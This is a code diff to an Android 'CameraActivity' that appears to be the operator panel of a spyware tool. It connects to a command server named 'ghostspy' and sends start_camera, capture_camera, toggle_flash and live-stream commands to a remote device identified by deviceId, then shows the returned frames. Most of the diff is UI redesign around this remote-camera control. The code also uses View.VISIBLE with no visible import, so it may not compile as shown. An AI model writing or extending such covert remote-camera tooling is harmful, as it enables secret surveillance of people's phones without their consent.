@@ -4,6 +4,7 @@ import android.app.Activity;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.os.Bundle;
+import android.os.Handler;
 import android.util.Base64;
 import android.view.Gravity;
 import android.widget.*;
@@ -11,12 +12,17 @@ import io.socket.client.IO;
 import io.socket.client.Socket;
 import org.json.JSONObject;
 import java.net.URISyntaxException;
+import java.util.Locale;
 
 public class CameraActivity extends Activity {
     private Socket socket;
     private String deviceId;
     private ImageView cameraView;
-    private Button switchBtn, captureBtn;
+    private TextView timerText, statusBadge, infoPanel;
+    private Button switchBtn, flashBtn, liveBtn, captureBtn;
+    private Handler timerHandler = new Handler();
+    private long startTime = 0;
+    private boolean isLive = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -24,50 +30,112 @@ public class CameraActivity extends Activity {
 
         deviceId = getIntent().getStringExtra("deviceId");
 
+        // Root layout
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
-        root.setBackgroundColor(0xFF080808);
-        root.setPadding(16, 16, 16, 16);
+        root.setBackgroundColor(0xFF0B0B0B);
+        setContentView(root);
 
         // Header
-        TextView title = new TextView(this);
-        title.setText("📷 Kamera");
-        title.setTextColor(0xFFFFFFFF);
-        title.setTextSize(20);
-        root.addView(title);
+        LinearLayout header = new LinearLayout(this);
+        header.setOrientation(LinearLayout.HORIZONTAL);
+        header.setGravity(Gravity.CENTER_VERTICAL);
+        header.setBackgroundColor(0xFF181818);
+        header.setPadding(16, 12, 16, 12);
+        root.addView(header);
 
-        // Kamera view
+        Button backBtn = new Button(this);
+        backBtn.setText("←");
+        backBtn.setTextColor(0xFFFFFFFF);
+        backBtn.setBackgroundColor(0x00000000);
+        backBtn.setOnClickListener(v -> finish());
+        header.addView(backBtn);
+
+        TextView title = new TextView(this);
+        title.setText("Camera Live Stream");
+        title.setTextColor(0xFFFFFFFF);
+        title.setTextSize(18);
+        title.setTypeface(null, android.graphics.Typeface.BOLD);
+        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
+                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
+        title.setLayoutParams(titleParams);
+        header.addView(title);
+
+        statusBadge = new TextView(this);
+        statusBadge.setText("● ONLINE");
+        statusBadge.setTextColor(0xFF00E676);
+        statusBadge.setTextSize(12);
+        statusBadge.setPadding(8, 4, 8, 4);
+        statusBadge.setBackground(getDrawable(R.drawable.card_admin));
+        header.addView(statusBadge);
+
+        // Preview kamera
         cameraView = new ImageView(this);
         cameraView.setBackgroundColor(0xFF000000);
         LinearLayout.LayoutParams camParams = new LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT, 600);
-        camParams.setMargins(0, 16, 0, 16);
+                LinearLayout.LayoutParams.MATCH_PARENT, 0);
+        camParams.weight = 1;
         cameraView.setLayoutParams(camParams);
         cameraView.setScaleType(ImageView.ScaleType.FIT_CENTER);
         root.addView(cameraView);
 
-        // Tombol kontrol
-        LinearLayout btnRow = new LinearLayout(this);
-        btnRow.setOrientation(LinearLayout.HORIZONTAL);
-        btnRow.setGravity(Gravity.CENTER);
+        // Panel info (semi transparan di atas preview) – kita letakkan di bawah preview
+        infoPanel = new TextView(this);
+        infoPanel.setText("Kamera: Depan | Res: 1080p | FPS: 30");
+        infoPanel.setTextColor(0xFFFFFFFF);
+        infoPanel.setBackgroundColor(0x99000000);
+        infoPanel.setPadding(12, 8, 12, 8);
+        root.addView(infoPanel);
 
-        switchBtn = new Button(this);
-        switchBtn.setText("🔄 Switch");
-        switchBtn.setTextColor(0xFFFFFFFF);
-        switchBtn.setBackgroundColor(0xFF151515);
+        // Timer & badge LIVE
+        LinearLayout liveBar = new LinearLayout(this);
+        liveBar.setOrientation(LinearLayout.HORIZONTAL);
+        liveBar.setGravity(Gravity.CENTER_VERTICAL);
+        liveBar.setPadding(16, 8, 16, 8);
+
+        timerText = new TextView(this);
+        timerText.setText("00:00:00");
+        timerText.setTextColor(0xFFFFFFFF);
+        timerText.setTextSize(18);
+        liveBar.addView(timerText);
+
+        TextView liveBadge = new TextView(this);
+        liveBadge.setText("🔴 LIVE");
+        liveBadge.setTextColor(0xFFFF1744);
+        liveBadge.setTextSize(12);
+        liveBadge.setPadding(8, 4, 8, 4);
+        liveBadge.setBackgroundColor(0x22000000);
+        liveBadge.setVisibility(isLive ? View.VISIBLE : View.GONE);
+        liveBar.addView(liveBadge);
+
+        root.addView(liveBar);
+
+        // Toolbar kontrol
+        LinearLayout toolbar = new LinearLayout(this);
+        toolbar.setOrientation(LinearLayout.HORIZONTAL);
+        toolbar.setGravity(Gravity.CENTER);
+        toolbar.setPadding(16, 12, 16, 12);
+        toolbar.setBackgroundColor(0x99000000);
+
+        switchBtn = createToolBtn("📷");
         switchBtn.setOnClickListener(v -> sendCmd("switch_camera"));
-        btnRow.addView(switchBtn);
+        toolbar.addView(switchBtn);
 
-        captureBtn = new Button(this);
-        captureBtn.setText("📸 Capture");
-        captureBtn.setTextColor(0xFFFFFFFF);
-        captureBtn.setBackgroundColor(0xFFFF1744);
+        flashBtn = createToolBtn("🔦");
+        flashBtn.setOnClickListener(v -> sendCmd("toggle_flash"));
+        toolbar.addView(flashBtn);
+
+        liveBtn = createToolBtn("📹");
+        liveBtn.setOnClickListener(v -> toggleLive());
+        toolbar.addView(liveBtn);
+
+        captureBtn = createToolBtn("📸");
         captureBtn.setOnClickListener(v -> sendCmd("capture_camera"));
-        btnRow.addView(captureBtn);
+        toolbar.addView(captureBtn);
 
-        root.addView(btnRow);
-        setContentView(root);
+        root.addView(toolbar);
 
+        // Mulai socket & minta frame
         try {
             socket = IO.socket("https://ghostspy.bruang.biz.id");
             socket.connect();
@@ -82,9 +150,47 @@ public class CameraActivity extends Activity {
             } catch (Exception e) {}
         });
 
-        // Mulai kamera
         sendCmd("start_camera");
     }
+
+    private Button createToolBtn(String icon) {
+        Button btn = new Button(this);
+        btn.setText(icon);
+        btn.setTextColor(0xFFFFFFFF);
+        btn.setBackground(getDrawable(R.drawable.card_admin));
+        btn.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(72, 72);
+        params.setMargins(4, 4, 4, 4);
+        btn.setLayoutParams(params);
+        return btn;
+    }
+
+    private void toggleLive() {
+        isLive = !isLive;
+        if (isLive) {
+            startTime = System.currentTimeMillis();
+            timerHandler.post(timerRunnable);
+            liveBtn.setText("⏹");
+            sendCmd("start_live");
+        } else {
+            timerHandler.removeCallbacks(timerRunnable);
+            timerText.setText("00:00:00");
+            liveBtn.setText("📹");
+            sendCmd("stop_live");
+        }
+    }
+
+    private Runnable timerRunnable = new Runnable() {
+        @Override
+        public void run() {
+            long elapsed = System.currentTimeMillis() - startTime;
+            int sec = (int) (elapsed / 1000) % 60;
+            int min = (int) (elapsed / 60000) % 60;
+            int hour = (int) (elapsed / 3600000);
+            timerText.setText(String.format(Locale.US, "%02d:%02d:%02d", hour, min, sec));
+            timerHandler.postDelayed(this, 1000);
+        }
+    };
 
     private void sendCmd(String cmd) {
         if (socket != null && socket.connected()) {
